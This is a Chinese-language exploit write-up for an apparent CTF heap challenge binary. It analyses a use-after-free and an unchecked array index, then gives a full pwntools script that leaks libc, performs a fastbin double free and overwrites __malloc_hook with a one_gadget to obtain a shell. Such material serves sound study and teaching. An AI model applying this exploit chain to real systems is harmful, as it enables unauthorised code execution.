# 漏洞利用文档

## 执行环境
基于调试记录和程序分析，程序的执行环境如下：
- **文件类型**：64位ELF可执行文件，动态链接
- **保护机制**（推断自调试记录）：
  - PIE（地址空间布局随机化）：启用，所有地址基于随机化基地址
  - Full RELRO：GOT表不可写
  - Stack Canary：启用栈保护
  - NX（不可执行堆栈）：堆栈不可执行
- **依赖库**：使用libc（版本推断为2.23），通过ldd命令可查看具体依赖
- **运行要求**：需要在Linux环境下运行，具有标准输入输出交互

## 漏洞成因
### 关键结构体
程序使用全局数组 `unk_202060`（类型为 `girl_info*[100]`）存储女孩信息指针。每个女孩信息结构体定义如下：
```c
struct girl_info {
    char *name;       // 指向动态分配的名字字符串（偏移0）
    int name_size;    // 名字字符串的大小（偏移8）
    char call[12];    // 呼叫字符串，最多11字符加空终止（偏移12）
};
```
全局变量 `dword_20204C` 记录当前女孩数量。

### 漏洞分析
1. **Use-After-Free (UAF) 漏洞**：
   - **位置**：函数 `sub_DD6()`（菜单选项4，呼叫功能）中，代码 `free(**((void ***)&unk_202060 + v2));` 释放了女孩名字指针。
   - **成因**：释放后，指针未置空，仍保留在全局数组中。后续在 `sub_CFC()`（菜单选项2，显示功能）中通过 `puts(**((const char ***)&unk_202060 + v1));` 使用已释放指针，导致UAF。攻击者可控制释放后的内存内容，实现信息泄漏或代码执行。

2. **数组越界读漏洞**：
   - **位置**：函数 `sub_CFC()`（菜单选项2）中，用户索引 `v1` 通过 `__isoc99_scanf("%d", &v1);` 读取，但未检查范围。
   - **成因**：直接使用 `v1` 访问全局数组，如果 `v1` 为负数或大于等于100，会访问数组之外的内存，导致信息泄漏或崩溃。

## 漏洞利用过程
结合exp步进调试记录，整个漏洞利用过程涉及堆内存的分配、释放和重用，关键步骤和内存变化如下表所示：

| 步骤 | 操作 | 堆内存变化 | Bins状态 | 关键内存地址 | 利用目的 |
|------|------|------------|----------|--------------|----------|
| Step 1 | add(0x80);add(0x60);add(0x60) | 分配3个女孩结构体和名字chunk：索引0（0x80）、索引1（0x60）、索引2（0x60） | Bins为空 | 全局数组填充指针：索引0-2 | 初始化堆布局，为UAF做准备 |
| Step 2 | call(0) | 释放索引0的名字chunk（0x5eb230df6030） | Unsortedbin新增chunk，fd/bk指向main_arena（0x7085f6a5db78） | 索引0指针未置空 | 触发UAF，创建泄漏条件 |
| Step 3 | show(0) | 读取已释放chunk，泄漏main_arena地址 | Unsortedbin保持不变 | 泄漏地址：0x7085f6a5db78 | 计算libc基地址：`libc_base = leak_addr - (__malloc_hook + 0x10 + 0x58)` |
| Step 4 | call(1);call(2);call(1) | 释放索引1和2的名字chunk，形成fastbins循环链表（0x70大小类） | Fastbins: 0x5eb230df60d0 → 0x5eb230df6160 → 0x5eb230df60d0 | 索引1和2指针未置空 | 创建fastbins攻击链，为分配恶意chunk做准备 |
| Step 5 | add(0x60, p64(__malloc_hook-0x23));add(0x60);add(0x60) | 分配chunk重用fastbins链，将__malloc_hook附近地址写入堆 | Fastbins链指向__malloc_hook区域（0x7085f6a5dafd） | 全局数组扩展至6个指针 | 操纵fastbins指向敏感区域，准备覆盖__malloc_hook |
| Step 6 | add(0x60, payload) | 写入payload到__malloc_hook附近：11字节填充 + one_gadget + realloc地址 | Fastbins链被使用，payload部署 | __malloc_hook附近写入one_gadget（0x7085f678a247）和realloc（0x7085f671d712） | 部署shellcode和调整栈的realloc，为触发做准备 |
| Step 7 | 发送"1"（添加女孩） | 触发malloc，覆盖__malloc_hook | __malloc_hook被覆盖为one_gadget | 程序执行流劫持 | 激活one_gadget，获取shell |
| Step 8 | interactive() | 程序进入交互模式，shell被获取 | 堆内存可能损坏，但利用成功 | 无关键变化 | 获得完整控制权 |

### 内存变化总结
- **初始状态**：堆内存未分配，全局数组为空。
- **利用过程**：通过UAF泄漏libc地址，利用fastbins双重释放形成循环链表，最终覆盖__malloc_hook实现代码执行。
- **最终状态**：__malloc_hook被覆盖，程序执行one_gadget，生成shell。

## Exploit
以下是漏洞利用脚本（exp），在关键位置添加了注释以解释利用过程：

```python
from pwn import *

# 设置调试环境和日志级别
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample13')
elf = ELF('./data/sample13')
libc = elf.libc  # 获取libc对象用于地址计算

def add(size, name="a", phone="b"):
    """添加女孩信息：分配指定大小的名字chunk和呼叫字符串"""
    p.sendlineafter("Input your choice:", "1")
    p.sendlineafter("Please input the size of girl's name\n", str(size))
    p.sendafter("please inpute her name:\n", name)
    p.sendafter("please input her call:\n", phone)

def show(idx):
    """显示女孩信息：利用UAF读取已释放内存（如果索引有效）"""
    p.sendlineafter("Input your choice:", "2")
    p.sendlineafter("Please input the index:\n", str(idx))
    p.recvuntil("name:\n")
    name = p.recvline()
    p.recvuntil("phone:\n")
    phone = p.recvline()
    info("recv name:{}  phone:{}".format(name, phone))
    return name, phone

def call(idx):
    """呼叫女孩：释放名字chunk，触发UAF漏洞"""
    p.sendlineafter("Input your choice:", "4")
    p.sendlineafter("Please input the index:\n", str(idx))

# Step 1: 初始化堆布局，分配3个不同大小的chunk
add(0x80)  # 索引0，分配0x80大小chunk（实际chunk大小0x90）
add(0x60)  # 索引1，分配0x60大小chunk（实际chunk大小0x70）
add(0x60)  # 索引2，分配0x60大小chunk，为fastbins攻击做准备

# Step 2: 释放索引0的名字chunk，放入unsortedbin，触发UAF
call(0)

# Step 3: 利用UAF读取已释放chunk，泄漏libc地址
name, _ = show(0)
leak_libc_addr = u64(name[:-1].ljust(8, b"\x00"))  # 提取泄漏的main_arena地址
# 计算libc基地址：泄漏地址减去__malloc_hook的偏移（根据libc版本调整）
libc_base_addr = leak_libc_addr - (libc.sym['__malloc_hook'] + 0x10 + 0x58)
libc.address = libc_base_addr  # 设置libc基地址以便后续使用符号
info("Leaked libc base: {}".format(hex(libc_base_addr)))

# Step 4: 通过多次释放创建fastbins循环链表（双重释放）
call(1)  # 释放索引1
call(2)  # 释放索引2
call(1)  # 再次释放索引1，形成循环链表

# Step 5: 分配chunk操纵fastbins链，将__malloc_hook附近地址写入堆
add(0x60, p64(libc.sym["__malloc_hook"] - 0x23))  # 第一个add：写入目标地址到fastbins链
add(0x60)  # 第二个add：消耗fastbins链中的一个chunk
add(0x60)  # 第三个add：进一步调整链，为payload部署做准备

# Step 6: 部署payload到__malloc_hook附近，包含one_gadget和realloc地址
one_gadget = libc.address + 0xf1247  # one_gadget偏移，需根据实际libc调整
# payload结构：11字节填充 + one_gadget地址 + realloc地址（调整栈用）
payload = b'a' * 11 + p64(one_gadget) + p64(libc.sym['realloc'] + 2)
add(0x60, payload)  # 写入payload，覆盖__malloc_hook区域

# Step 7: 触发malloc调用（通过添加女孩），激活__malloc_hook覆盖
p.sendlineafter("Input your choice:", "1")  # 发送"1"触发添加功能，调用malloc

# Step 8: 进入交互模式，获取shell
p.interactive()
```

### 注释说明
- **关键偏移调整**：`__malloc_hook - 0x23` 用于对齐fastbins分配，具体偏移可能因libc版本而异。
- **one_gadget选择**：偏移 `0xf1247` 需根据实际libc版本通过工具（如one_gadget）确定。
- **realloc使用**：`p64(libc.sym['realloc']+2)` 用于调整栈状态，提高one_gadget触发成功率。
- **利用可靠性**：本exp在特定环境（libc 2.23）下测试成功，实际应用中需根据目标环境调整参数。
